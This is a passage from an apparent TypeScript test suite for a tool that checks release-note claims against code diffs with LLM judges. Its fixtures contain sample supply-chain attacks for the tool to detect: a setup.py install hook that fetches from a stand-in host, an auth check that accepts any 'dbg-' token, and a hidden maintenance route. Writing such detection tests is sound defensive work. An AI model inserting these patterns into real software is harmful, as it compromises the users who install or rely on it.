// SPDX-License-Identifier: GPL-3.0-or-later
import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  computeCoverage,
  isGeneratedEntry,
  isVagueClaim,
  medianVerdict,
  resolveVotes,
  verifyClaims,
} from "../src/verify.ts";
import { hunkFunctions, lexicalMatch } from "../src/match.ts";
import {
  buildJudgePrompt,
  parseSurplusOutput,
  parseJudgeResponse,
  extractJsonObject,
  selectEngine,
  resolveEngines,
  type JudgeEngine,
  type JudgeVerdict,
} from "../src/judge.ts";
import { withVerdictCache } from "../src/cache.ts";
import type { BumpJoin, BumpResolution, Claim, ClaimBump, Commit } from "../src/types.ts";

function claim(text: string, prNumbers: number[] = []): Claim {
  return {
    id: 0,
    section: "What's Changed",
    text,
    kind: "change",
    prNumbers,
    shas: [],
    advisories: [],
    codeSpans: [],
  };
}

function commit(subject: string, prNumbers: number[] = []): Commit {
  return { sha: "abc123def", subject, body: "", author: "dev", prNumbers };
}

test("isGeneratedEntry: PR-list boilerplate whose title equals the squash subject", () => {
  const c1 = claim("OpenDAL S3 parameter support by @txase in #6127", [6127]);
  assert.equal(isGeneratedEntry(c1, [commit("OpenDAL S3 parameter support (#6127)", [6127])]), true);
  // Handwritten claim: no attribution tail.
  assert.equal(isGeneratedEntry(claim("SSRF via the icon endpoint"), [commit("Fix icons")]), false);
  // Attribution tail but the title diverges from the commit.
  const c2 = claim("Something entirely different by @x in #7", [7]);
  assert.equal(isGeneratedEntry(c2, [commit("Actual subject (#7)", [7])]), false);
});

test("isGeneratedEntry: sha-list changelog entries restating the commit subject", () => {
  const c = claim("f885d87827bcae30a07063f2723cd03458144a00 Fix invalid ip syntax");
  c.shas = ["f885d87827bcae30a07063f2723cd03458144a00"];
  const target = { sha: "f885d87827bcae30a07063f2723cd03458144a00", subject: "Fix invalid ip syntax", body: "", author: "dev", prNumbers: [] };
  assert.equal(isGeneratedEntry(c, [target]), true);
  // Same sha but diverging text stays a real (checkable) claim.
  const diverging = claim("f885d87827bcae30a07063f2723cd03458144a00 Completely different statement");
  diverging.shas = ["f885d87827bcae30a07063f2723cd03458144a00"];
  assert.equal(isGeneratedEntry(diverging, [target]), false);
});

test("isVagueClaim: no content tokens beyond boilerplate", () => {
  assert.equal(isVagueClaim(claim("Updates and fixes by @BlackDex in #7235")), true);
  assert.equal(isVagueClaim(claim("Misc updates and fixes by @BlackDex in #7406")), true);
  assert.equal(isVagueClaim(claim("Reject unrecognised DATABASE_URL instead of silent SQLite fallback")), false);
});

test("hunkFunctions extracts declaration context from hunk headers", () => {
  const patch = [
    "@@ -10,4 +10,6 @@ pub async fn register_access(uuid: &str) -> Result<()> {",
    "+    let x = 1;",
    "@@ -50,2 +52,3 @@ impl SendHeaders",
    "+    field: bool,",
    "@@ -1,1 +1,2 @@ function handleClick(event) {",
    "+  return;",
    "@@ -7,1 +7,2 @@ func (s *Server) ServeHTTP(w http.ResponseWriter) {",
    "+  x()",
  ].join("\n");
  const fns = hunkFunctions(patch);
  assert.ok(fns.includes("register_access"));
  assert.ok(fns.includes("SendHeaders"));
  assert.ok(fns.includes("handleClick"));
  assert.ok(fns.includes("ServeHTTP"), `Go method receiver: got ${fns.join(",")}`);
  assert.ok(!fns.includes("func"));
});

function vote(verdict: JudgeVerdict["verdict"]): JudgeVerdict {
  return { verdict, confidence: 0.9, files: [], reasoning: verdict };
}

test("medianVerdict: one outlier cannot flip the result", () => {
  assert.equal(medianVerdict([vote("no-evidence"), vote("verified"), vote("verified")]).verdict, "verified");
  assert.equal(medianVerdict([vote("contradicted"), vote("contradicted"), vote("partial")]).verdict, "contradicted");
  assert.equal(medianVerdict([vote("no-evidence")]).verdict, "no-evidence");
  // Two votes (one pass failed and did not count): the stricter one wins. A
  // single lenient vote must never be what clears a release, and every extra
  // pass here was requested because the first verdict was release-critical.
  assert.equal(medianVerdict([vote("contradicted"), vote("verified")]).verdict, "contradicted");
  assert.equal(medianVerdict([vote("no-evidence"), vote("verified")]).verdict, "no-evidence");
  assert.equal(medianVerdict([vote("verified"), vote("verified")]).verdict, "verified");
});

test("resolveVotes: contradicted needs a second voter", () => {
  // The shape that measured 45/45/35 on sniffnet v1.5.1 across three
  // identical runs: one pass failed, and the surviving pair let a single
  // "contradicted" floor the release and raise a critical flag.
  const demoted = resolveVotes([vote("contradicted"), vote("no-evidence")]);
  assert.equal(demoted.verdict, "no-evidence");
  assert.match(demoted.reasoning, /one of 2 verification passes/i);
  // The milder reading they agree on — not "partial" because one voter was
  // lenient, and not "verified" either.
  assert.equal(resolveVotes([vote("contradicted"), vote("partial")]).verdict, "partial");
  assert.equal(resolveVotes([vote("contradicted"), vote("verified")]).verdict, "verified");
  // Seconded, so it stands, with its own reasoning untouched.
  const seconded = resolveVotes([vote("contradicted"), vote("contradicted")]);
  assert.equal(seconded.verdict, "contradicted");
  assert.equal(seconded.reasoning, "contradicted");
  assert.equal(
    resolveVotes([vote("contradicted"), vote("contradicted"), vote("verified")]).verdict,
    "contradicted",
  );
  // A lone vote is not a majority of anything, so it cannot be one either.
  assert.equal(resolveVotes([vote("contradicted")]).verdict, "contradicted");
  // Everything below contradicted resolves exactly as before.
  assert.equal(resolveVotes([vote("no-evidence"), vote("verified")]).verdict, "no-evidence");
  assert.equal(
    resolveVotes([vote("no-evidence"), vote("verified"), vote("verified")]).verdict,
    "verified",
  );
});

test("parseJudgeResponse: need-protocol and verdicts", () => {
  const need = parseJudgeResponse('{"need":["src/a.rs","src/b.rs"]}');
  assert.ok("need" in need);
  assert.deepEqual((need as { need: string[] }).need, ["src/a.rs", "src/b.rs"]);
  const verdict = parseJudgeResponse('{"verdict":"verified","confidence":0.8,"files":[],"reasoning":"x"}');
  assert.ok(!("need" in verdict));
});

test("withVerdictCache: second call with the same prompt hits the disk", async () => {
  // Own cache home: the real one may not exist (or may be refused) on the
  // machine running the suite, and a test must not write into the user's.
  process.env.XDG_CACHE_HOME = mkdtempSync(join(tmpdir(), "crii-cache-"));
  let calls = 0;
  const engine = withVerdictCache({
    name: "test-stub",
    judge: async () => {
      calls++;
      return `response-${calls}`;
    },
  });
  const prompt = `cache-test-${process.pid}-${process.hrtime.bigint()}`;
  const first = await engine.judge(prompt);
  const second = await engine.judge(prompt);
  assert.equal(first, second);
  assert.equal(calls, 1);
});

test("extractJsonObject repairs unterminated small-model output", () => {
  // Qwen3.5 pattern: closes the reasoning string but drops the final brace.
  const noBrace = parseJudgeResponse(
    '{"verdict":"verified","confidence":0.9,"files":["a.rs"],"reasoning":"fix confirmed."',
  );
  assert.ok(!("need" in noBrace));
  assert.equal(noBrace.verdict, "verified");
  assert.equal(noBrace.reasoning, "fix confirmed.");
  // Harder: stops mid-string inside a nested array.
  const midString = extractJsonObject('{"surplus":[{"description":"new endpo') as {
    surplus: Array<{ description: string }>;
  };
  assert.equal(midString.surplus[0].description, "new endpo");
  assert.throws(() => extractJsonObject("no json here"), /no JSON object/);
});

test("extractJsonObject reports whether the repair path ran", () => {
  // Needing repair is a calibration signal even when the repair succeeds.
  const repaired = { repaired: false };
  extractJsonObject('{"verdict":"verified","confidence":0.9', repaired);
  assert.equal(repaired.repaired, true);

  const clean = { repaired: false };
  extractJsonObject('{"verdict":"verified"}', clean);
  assert.equal(clean.repaired, false);
});

test("extractJsonObject survives the two shapes that made judge answers unusable", () => {
  // Measured on a watch home: 22 of 101 releases lost a claim to an
  // unparseable answer, and the fallback is by construction the milder
  // reading — so every one of these silently nudged a score upward.

  // A cut landing right after a comma or a key is where a truncated answer
  // most often stops, and closing brackets alone cannot rescue it.
  const afterComma = extractJsonObject('{"verdict":"verified","files":["a.go"],') as {
    verdict: string;
    files: string[];
  };
  assert.equal(afterComma.verdict, "verified");
  assert.deepEqual(afterComma.files, ["a.go"]);

  const afterKey = extractJsonObject('{"verdict":"verified","confidence":0.85,"reasoning"') as {
    verdict: string;
    confidence: number;
  };
  assert.equal(afterKey.verdict, "verified");
  assert.equal(afterKey.confidence, 0.85);

  // A model that answers and then adds a remark containing a brace: the
  // greedy scan from the last "}" swallows the remark, the object is fine.
  const withRemark = extractJsonObject(
    '{"verdict":"partial","confidence":0.5,"files":[],"reasoning":"x"}\n\nNote: run() {} is unchanged.',
  ) as { verdict: string };
  assert.equal(withRemark.verdict, "partial");

  // Both are format issues, so calibration still hears about them.
  const meta = { repaired: false };
  extractJsonObject('{"verdict":"verified","files":["a.go"],', meta);
  assert.equal(meta.repaired, true);
});

test("a malformed answer is quoted head and tail, because the tail is the diagnosis", () => {
  // Head-only excerpts could not distinguish "the model was cut off" from
  // "the model wrapped its answer in prose" — the two need opposite fixes,
  // and only the tail tells them apart.
  const unrepairable = `{"reasoning":"${"x".repeat(600)}","verdict":verifie`;
  assert.throws(
    () => extractJsonObject(unrepairable),
    (err: Error) =>
      /\(\d+ chars\)/.test(err.message) &&
      /…\[\d+ chars\]…/.test(err.message) &&
      err.message.includes("verifie"),
  );
});

test("selectEngine: openai needs an explicit model, then builds the engine", () => {
  assert.throws(() => selectEngine({ engine: "openai" }), /--model/);
  const engine = selectEngine({ engine: "openai", model: "qwen3:8b" });
  assert.equal(engine?.name, "openai/qwen3:8b@4096");
});

test("rankCalibrations: accuracy first, rubber-stamp risk second, speed last", async () => {
  const { rankCalibrations } = await import("../src/calibrate.ts");
  const cal = (model: string, passed: number, overVerified: number, avgMs: number | null) => ({
    engine: `openai/${model}`,
    model,
    outcomes: new Array(8).fill({}),
    passed,
    overVerified,
    formatIssues: 0,
    avgMs,
  });
  const ranked = rankCalibrations([
    cal("slow-accurate", 8, 0, 9000),
    cal("fast-rubberstamp", 6, 2, 1000),
    cal("fast-honest", 6, 0, 1000),
    cal("cached-accurate", 8, 0, null),
  ]);
  assert.deepEqual(
    ranked.map((r) => r.model),
    ["slow-accurate", "cached-accurate", "fast-honest", "fast-rubberstamp"],
  );
});

test("escalation engine overrides release-critical local verdicts", async () => {
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [],
    files: [
      {
        path: "src/auth.rs",
        status: "modified",
        additions: 2,
        deletions: 0,
        patch: "@@ -1,1 +1,3 @@ fn check()\n+    validate_token();\n+    audit();\n",
      },
    ],
    commitFiles: async () => [],
    warnings: [],
  };
  const weak = {
    name: "weak",
    judge: async () =>
      '{"verdict":"no_evidence","confidence":0.9,"files":[],"reasoning":"local model unsure"}',
  };
  const strong = {
    name: "strong",
    judge: async () =>
      '{"verdict":"verified","confidence":0.95,"files":["src/auth.rs"],"reasoning":"token validation added"}',
  };
  const [result] = await verifyClaims(
    data,
    [claim("Add token validation to auth check")],
    { judgeMode: "auto", engine: weak, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 },
  );
  assert.equal(result.verdict, "verified");
  assert.ok(result.evidence.methods.includes("escalated"));
  assert.equal(result.reasoning, "token validation added");
});

function releaseData(files: Array<{ path: string; patch: string }>) {
  return {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [] as Commit[],
    files: files.map((f) => ({
      path: f.path,
      status: "modified",
      additions: 3,
      deletions: 1,
      patch: f.patch,
    })),
    commitFiles: async () => [],
    warnings: [] as string[],
  };
}

test("setup.py shape: local 'verified' under a non-security section escalates", async () => {
  // The 9B rubber-stamped an install hook as "Packaging cleanup" under
  // "What's Changed" — no advisory, no Security section, so the old
  // claim-only trigger would not have escalated.
  const data = releaseData([
    {
      path: "setup.py",
      patch:
        '@@ -10,3 +10,9 @@ setup(\n+# packaging cleanup\n+class PostInstall(install):\n+    def run(self):\n+        urllib.request.urlopen("https://collector.example/p").read()\n+        install.run(self)\n+    cmdclass={"install": PostInstall},\n',
    },
  ]);
  let escalations = 0;
  const local = {
    name: "local",
    judge: async () =>
      '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"routine packaging changes"}',
  };
  const strong = {
    name: "strong",
    judge: async () => {
      escalations++;
      return '{"verdict":"contradicted","confidence":0.95,"files":["setup.py"],"reasoning":"install hook fetches remote code"}';
    },
  };
  const [result] = await verifyClaims(data, [claim("Packaging cleanup")], {
    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(escalations, 1);
  assert.equal(result.verdict, "contradicted");
  assert.ok(result.evidence.methods.includes("escalated"));
});

test("a 'verified' on non-sensitive paths does not escalate", async () => {
  const data = releaseData([
    { path: "src/markdown.ts", patch: "@@ -1,1 +1,2 @@\n+export const tableAlign = 'left';\n" },
  ]);
  let escalations = 0;
  const local = {
    name: "local",
    judge: async () =>
      '{"verdict":"verified","confidence":0.9,"files":["src/markdown.ts"],"reasoning":"alignment constant added"}',
  };
  const strong = {
    name: "strong",
    judge: async () => {
      escalations++;
      return '{"verdict":"verified","confidence":0.9,"files":[],"reasoning":"unused"}';
    },
  };
  const [result] = await verifyClaims(data, [claim("Improve markdown table alignment")], {
    judgeMode: "all", engine: local, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(escalations, 0);
  assert.equal(result.verdict, "verified");
  assert.ok(!result.evidence.methods.includes("escalated"));
});

test("every attack-shape golden case escalates a rubber-stamped local 'verified'", async () => {
  const { readFile } = await import("node:fs/promises");
  const golden = JSON.parse(
    await readFile(new URL("./eval/golden.json", import.meta.url), "utf8"),
  ) as Array<{ name: string; section: string; claim: string; hunks: Array<{ path: string; hunk: string }> }>;
  const attackShapes = [
    "fabricated-feature-vs-unrelated-migration",
    "js-lockfile-nonregistry-source",
    "setup-py-install-hook-vs-cleanup-claim",
    "go-module-source-rename-vs-update-claim",
    "version-claim-vs-actual-bump",
  ];
  for (const name of attackShapes) {
    const gcase = golden.find((g) => g.name === name);
    assert.ok(gcase, `golden case ${name} missing`);
    const data = releaseData(gcase.hunks.map((h) => ({ path: h.path, patch: h.hunk })));
    const cl = claim(gcase.claim);
    cl.section = gcase.section;
    let escalations = 0;
    const rubberStamp = {
      name: "local-9b",
      judge: async () =>
        JSON.stringify({
          verdict: "verified",
          confidence: 0.9,
          files: gcase.hunks.map((h) => h.path),
          reasoning: "looks fine",
        }),
    };
    const strong = {
      name: "strong",
      judge: async () => {
        escalations++;
        return '{"verdict":"contradicted","confidence":0.95,"files":[],"reasoning":"malicious change"}';
      },
    };
    const [result] = await verifyClaims(data, [cl], {
      judgeMode: "all", engine: rubberStamp, escalateEngine: strong, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
    });
    assert.equal(escalations, 1, `${name}: expected exactly one escalation call`);
    assert.equal(result.verdict, "contradicted", name);
    assert.ok(result.evidence.methods.includes("escalated"), name);
  }
});

test("judge prompt: circularity rule always, need guidance only with allowNeed", () => {
  const base = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    section: "Bug Fixes",
    claimText: "Fix race in cleanup.go",
    hunks: [],
    commits: [],
  };
  const withNeed = buildJudgePrompt({ ...base, allPaths: ["a.go"], allowNeed: true });
  assert.ok(withNeed.includes("names a file or function whose diff is not shown"));
  const withoutNeed = buildJudgePrompt(base);
  assert.ok(!withoutNeed.includes("names a file or function"));
  assert.ok(withoutNeed.includes("notes cannot prove themselves"));
});

test("a changelog-only commit does not become evidence for a vague claim", async () => {
  // Anchored vague claim ("Updates and fixes") whose commit only touches the
  // changelog: the old fallback sent that hunk to the judge — the notes
  // proving the notes. The judge must now see no evidence at all.
  const cl = claim("Updates and fixes by @x in #7", [7]);
  const linked: Commit = { sha: "abc123def", subject: "Bump deps and tweak CI (#7)", body: "", author: "dev", prNumbers: [7] };
  const changelogFile = {
    path: "CHANGELOG.md",
    status: "modified",
    additions: 2,
    deletions: 0,
    patch: "@@ -1,2 +1,4 @@\n # Changelog\n+\n+- Updates and fixes",
  };
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [linked],
    files: [changelogFile],
    commitFiles: async () => [changelogFile],
    warnings: [] as string[],
  };
  const prompts: string[] = [];
  const engine = {
    name: "capture",
    judge: async (prompt: string) => {
      prompts.push(prompt);
      return '{"verdict":"no_evidence","confidence":0.8,"files":[],"reasoning":"nothing shown"}';
    },
  };
  const [result] = await verifyClaims(data, [cl], {
    judgeMode: "auto", engine, escalateEngine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(result.verdict, "no-evidence");
  const claimPrompts = prompts.filter((p) => p.includes("Candidate diff evidence"));
  assert.ok(claimPrompts.length > 0);
  for (const p of claimPrompts) {
    assert.ok(!p.includes("--- CHANGELOG.md"), "changelog hunk leaked into judge evidence");
    assert.ok(p.includes("(no matching hunks found)"));
  }
});

test("calibration offers the need protocol and the case's full file list", async () => {
  const { runCalibration } = await import("../src/calibrate.ts");
  const prompts: string[] = [];
  const engine = {
    name: "need-mock",
    judge: async (prompt: string) => {
      prompts.push(prompt);
      // Round 1 carries the escape hatch; the served round must verdict.
      if (prompt.includes('{"need":["path1","path2"]}')) {
        return '{"need":["internal/session/cleanup.go"]}';
      }
      return '{"verdict":"no_evidence","confidence":0.8,"files":[],"reasoning":"file never arrived"}';
    },
  };
  const cal = await runCalibration(engine, 4);
  const needCase = cal.outcomes.find((o) => o.name === "legit-need-more-files");
  assert.ok(needCase);
  assert.equal(needCase.pass, true);
  assert.equal(needCase.got, "need→no-evidence");
  const needPrompt = prompts.find((p) => p.includes("internal/session/cleanup.go"));
  assert.ok(needPrompt, "need case prompt must list the file the claim names");
  assert.ok(needPrompt.includes('{"need":["path1","path2"]}'), "need protocol must be offered");
});

test("parseSurplusOutput validates and caps items", () => {
  const items = parseSurplusOutput(
    'noise {"surplus":[{"description":"new endpoint /admin","file":"src/api.rs","notable":true},{"description":"comment fix","file":"a.rs","notable":false}],"reasoning":"x"} tail',
  );
  assert.equal(items.length, 2);
  assert.equal(items[0].notable, true);
  assert.equal(items[1].notable, false);
  assert.deepEqual(parseSurplusOutput('{"surplus":[]}'), []);
});

test("a note echoing its own commit subject is not evidence about the diff", async () => {
  // The whole attack: the author writes the note and the commit message, so
  // "they agree" is a statement about one person's copy-paste, not about the
  // code. Pre-fix this scored verified (0.90) with the judge never called.
  const linked: Commit = {
    sha: "4bce803d7b",
    subject: "Improve token cache eviction under load (#42)",
    body: "",
    author: "mallory",
    prNumbers: [42],
  };
  const backdoored = {
    path: "src/auth.js",
    status: "modified",
    additions: 4,
    deletions: 1,
    patch:
      "@@ -1,3 +1,6 @@ function verifyToken(token)\n" +
      "+  if (token.startsWith('dbg-')) return true;\n" +
      "   return checkSignature(token);\n",
  };
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [linked],
    files: [backdoored],
    commitFiles: async () => [backdoored],
    warnings: [] as string[],
  };
  const cl = claim("Improve token cache eviction under load (#42)", [42]);

  let judged = 0;
  const engine = {
    name: "counting",
    judge: async () => {
      judged++;
      return '{"verdict":"contradicted","confidence":1,"files":[],"reasoning":"backdoor"}';
    },
  };
  // --judge auto (the default) must route this to the judge, not settle it.
  const [withJudge] = await verifyClaims(data, [cl], {
    judgeMode: "auto", engine, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(judged > 0, true, "the judge must see a claim the diff does not support");
  assert.equal(withJudge.verdict, "contradicted");

  // And with no judge at all it may not claim more than "there is an anchor".
  const [deterministic] = await verifyClaims(data, [claim("Improve token cache eviction under load (#42)", [42])], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(deterministic.verdict, "partial");
  assert.match(deterministic.reasoning, /restates the commit subject/);
});

test("identifier overlap alone buys a reading, not a verified verdict", async () => {
  // GyulyVGC/sniffnet@v1.4.1 — the `inverted-claim` survivor found on
  // 2026-08-06. The real note and a version negating it carry the same two
  // spans, hit the same diff and score the same 5, so overlap cannot tell
  // them apart. Pre-fix both settled as verified (0.80) with no judge call:
  // `judgeMode: auto` never asks about a claim the deterministic pass already
  // called verified.
  const renamed = {
    path: "src/networking/manage_packets.rs",
    status: "modified",
    additions: 3,
    deletions: 2,
    patch:
      "@@ -1,4 +1,5 @@ fn lookup_country(ip: &IpAddr)\n" +
      "-    let country = record.country;\n" +
      "+    let country_code = record.country_code;\n",
  };
  const data = {
    repoLabel: "t/t",
    baseRef: "v1",
    headRef: "v2",
    notes: "",
    commits: [] as Commit[],
    files: [renamed],
    commitFiles: async () => [renamed],
    warnings: [] as string[],
  };
  const spanned = (text: string): Claim => {
    const c = claim(text);
    c.codeSpans = ["country", "country_code"];
    return c;
  };
  // The same sentence, quoting the file it changed as well. Issue #12 moved
  // `country` — an ordinary word — from 2 to 1, so the sniffnet pair scores 4
  // and the deterministic pass no longer settles it at all. That is the fix
  // working; it also means the pair no longer reaches the bar this test's
  // second half is about, and a fixture that does has to name two spans whose
  // shape says code.
  const atTheBar = (text: string): Claim => {
    const c = claim(text);
    c.codeSpans = ["country_code", "manage_packets.rs"];
    return c;
  };
  const honest = "Fix support for IPinfo's databases (the most recent version renamed the `country` field to `country_code`)";
  const inverted = honest.replace("Fix", "Break");

  for (const text of [honest, inverted]) {
    let judged = 0;
    const engine = {
      name: "counting",
      judge: async () => {
        judged++;
        return '{"verdict":"partial","confidence":1,"files":[],"reasoning":"read the sentence"}';
      },
    };
    const [result] = await verifyClaims(data, [spanned(text)], {
      judgeMode: "auto", engine, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
    });
    assert.equal(judged, 1, `overlap-only evidence must reach the judge: ${text.slice(0, 20)}`);
    assert.equal(result.judged, true);
    assert.equal(result.verdict, "partial");
  }

  // And a `verified` on this evidence is never one model's word. Four runs of
  // the real sniffnet inversion split 3 contradicted / 1 verified, and only
  // the lone verified ended the question — a single vote was the judgement
  // exactly where the deterministic pass knew nothing.
  {
    const votes = ["verified", "contradicted", "contradicted"];
    let call = 0;
    const engine = {
      name: "splitting",
      judge: async () => {
        const v = votes[Math.min(call++, votes.length - 1)];
        return `{"verdict":"${v}","confidence":1,"files":[],"reasoning":"vote"}`;
      },
    };
    const [result] = await verifyClaims(data, [atTheBar(inverted)], {
      judgeMode: "auto", engine, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
    });
    assert.equal(call, 3, "a verified on overlap-only evidence must be reviewed, not taken");
    assert.equal(result.verdict, "contradicted");
  }

  // With no judge the deterministic contract stands: same input, same output —
  // the fallback still reads verified on overlap that reaches the bar, and the
  // pair that no longer reaches it reads partial rather than settling.
  const [deterministic] = await verifyClaims(data, [atTheBar(inverted)], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(deterministic.verdict, "verified");
  assert.equal(deterministic.judged, false);

  const [belowBar] = await verifyClaims(data, [spanned(inverted)], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(belowBar.verdict, "partial");
});

test("one identifier hit in the linked commit is a lead, not a verified verdict", async () => {
  const linked: Commit = { sha: "aa11bb22cc", subject: "chore: tidy", body: "", author: "dev", prNumbers: [7] };
  const file = {
    path: "src/session.js",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -1,1 +1,2 @@\n+const verifyToken = null;\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const cl: Claim = { ...claim("Rewrote `verifyToken` for constant-time comparison (#7)", [7]), codeSpans: ["verifyToken"] };
  const [r] = await verifyClaims(data, [cl], {
    judgeMode: "off", engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  });
  assert.equal(r.verdict, "partial");
});

test("a note that says a field is gone is not settled by a diff that adds it", async () => {
  // Issue #13, and `soundcloud/api@2026-06-15` is the shape of it rather than
  // an oddity: the repo publishes API documentation, so every release rewrites
  // the same file about the same endpoints. A claim belonging to a release two
  // months later — "GET /tracks/{track_urn}/streams no longer returns
  // `http_mp3_128_url`" — planted into it matched `track_urn`,
  // `http_mp3_128_url` and `preview_mp3_128_url` for a lexical score of 8 and
  // settled `verified` with no judge. All three occur there on `+` lines only:
  // that release is the one that ADDED the fields the note says are gone.
  const adding = {
    path: "openapi/api.yaml",
    status: "modified",
    additions: 3,
    deletions: 0,
    patch:
      "@@ -1,0 +1,3 @@\n+  '/tracks/{track_urn}/streams':\n+        http_mp3_128_url: 'https://api.example/x'\n+        preview_mp3_128_url: 'https://api.example/y'\n",
  };
  const removing = {
    ...adding,
    additions: 0,
    deletions: 2,
    patch:
      "@@ -1,3 +1,1 @@\n   '/tracks/{track_urn}/streams':\n-        http_mp3_128_url: 'https://api.example/x'\n-        preview_mp3_128_url: 'https://api.example/y'\n",
  };
  const gone: Claim = {
    ...claim(
      "**GET /tracks/{track_urn}/streams** no longer returns `http_mp3_128_url` or `preview_mp3_128_url`.",
    ),
    codeSpans: ["http_mp3_128_url", "preview_mp3_128_url"],
  };
  const opts = {
    judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000,
  };
  const release = (file: typeof adding, commits: Commit[] = []) => ({
    repoLabel: "t/api", baseRef: "a", headRef: "b", notes: "",
    commits, files: [file], commitFiles: async () => [file], warnings: [] as string[],
  });

  // The bar is reached either way — what separates them is direction, not weight.
  assert.ok(lexicalMatch(gone, [adding]).score >= 5);
  assert.ok(lexicalMatch(gone, [removing]).score >= 5);

  const [planted] = await verifyClaims(release(adding), [gone], opts);
  assert.equal(planted.verdict, "partial");
  assert.match(planted.reasoning, /only on lines it ADDS/);

  // Precision, the other half: the release that really does take the fields
  // away settles exactly as it did before.
  const [honest] = await verifyClaims(release(removing), [gone], opts);
  assert.equal(honest.verdict, "verified");

  // Naming a commit in the range does not buy the reading either — an anchor
  // says which commit, not which direction.
  const linked = commit("docs: document the streams payload (#12)", [12]);
  const [anchored] = await verifyClaims(
    release(adding, [linked]),
    [{ ...gone, prNumbers: [12] }],
    opts,
  );
  assert.equal(anchored.verdict, "partial");
  assert.match(anchored.reasoning, /only on lines it ADDS/);

  // And the gate reads what the sentence asserts, not how much the diff adds:
  // the same evidence under an additive note is untouched.
  const arrived: Claim = {
    ...gone,
    text: "**GET /tracks/{track_urn}/streams** now returns `http_mp3_128_url` and `preview_mp3_128_url`.",
  };
  const [added] = await verifyClaims(release(adding), [arrived], opts);
  assert.equal(added.verdict, "verified");
});

test("a repeated line that points into this release is still a claim", async () => {
  // Both sets of notes are written by the publisher, so "I said it last time
  // too" cannot be what takes a claim out of the check. Standing text really
  // is standing text: it anchors nowhere in this range.
  const linked: Commit = {
    sha: "cafe1234ab",
    subject: "Wire maintenance route (#42)",
    body: "",
    author: "mallory",
    prNumbers: [42],
  };
  const file = {
    path: "src/routes.js",
    status: "modified",
    additions: 1,
    deletions: 0,
    patch: "@@ -1,2 +1,3 @@ function routes(app)\n+  app.post('/__maint', run);\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const anchored = claim("Add a remote maintenance endpoint for support engineers (#42)", [42]);
  anchored.carriedOverFrom = "v1";
  const [checked] = await verifyClaims(data, [anchored], opts);
  assert.notEqual(checked.verdict, "skipped", "an anchored repeat is checked");

  const standing = claim("This project follows semantic versioning");
  standing.carriedOverFrom = "v1";
  const [skipped] = await verifyClaims(data, [standing], opts);
  assert.equal(skipped.verdict, "skipped");
  assert.match(skipped.reasoning, /Carried over verbatim/);
});

test("standing text documents nothing, so it earns no coverage", async () => {
  // The other coverage channel: a commit counts as documented when a claim's
  // content tokens appear in its own diff (cherry-pick workflows lose the PR
  // reference). Text carried over from the base release was written before
  // this commit existed, so it cannot be what documents it.
  const linked: Commit = {
    sha: "beef5678cd",
    subject: "Refactor the plugin loader for lazy imports",
    body: "",
    author: "dev",
    prNumbers: [],
  };
  const file = {
    path: "src/loader.js", status: "modified", additions: 40, deletions: 2,
    patch: "@@ -1,2 +1,42 @@\n+class PluginLoader {\n+  const lazy = () => import(modulePath);\n+}\n",
  };
  const data = {
    repoLabel: "t/t", baseRef: "v1", headRef: "v2", notes: "",
    commits: [linked], files: [file], commitFiles: async () => [file], warnings: [] as string[],
  };
  const opts = { judgeMode: "off" as const, engine: null, concurrency: 1, maxHunks: 4, maxEvidenceChars: 10000 };

  const spanned = (): Claim => {
    const c = claim("Refactor the `PluginLoader` to lazy-load via `modulePath`");
    c.codeSpans = ["PluginLoader", "modulePath"];
    return c;
  };
  const standing = spanned();
  standing.carriedOverFrom = "v1";
  const skippedResults = await verifyClaims(data, [standing], opts);
  assert.equal(skippedResults[0].verdict, "skipped");
  const withStanding = await computeCoverage(data, [standing], skippedResults);
  assert.equal(withStanding.uncovered.length, 1, "the commit is still undocumented");

  // The same sentence, written for this release, does document it: its
  // identifiers appear in the commit's own diff.
  const fresh = spanned();
  const freshResults = await verifyClaims(data, [fresh], opts);
  const withFresh = await computeCoverage(data, [fresh], freshResults);
  assert.equal(withFresh.uncovered.length, 0);
});

test("a claim covers a commit only when it reaches EVERY file of it", async () => {
  // The route that produced every remaining `omission` miss until 2026-08-09,
  // and the one nothing in the suite was watching: the share sat at 0.5 for
  // months and moving it to 1 left 531 tests green. At half a commit's files
  // it reads "somebody mentioned files like these" as "somebody documented
  // this".
  //
  // Two commits, one claim. The documented commit touches the file the claim
  // cites; the other touches that file AND one nothing describes.
  const documented: Commit = {
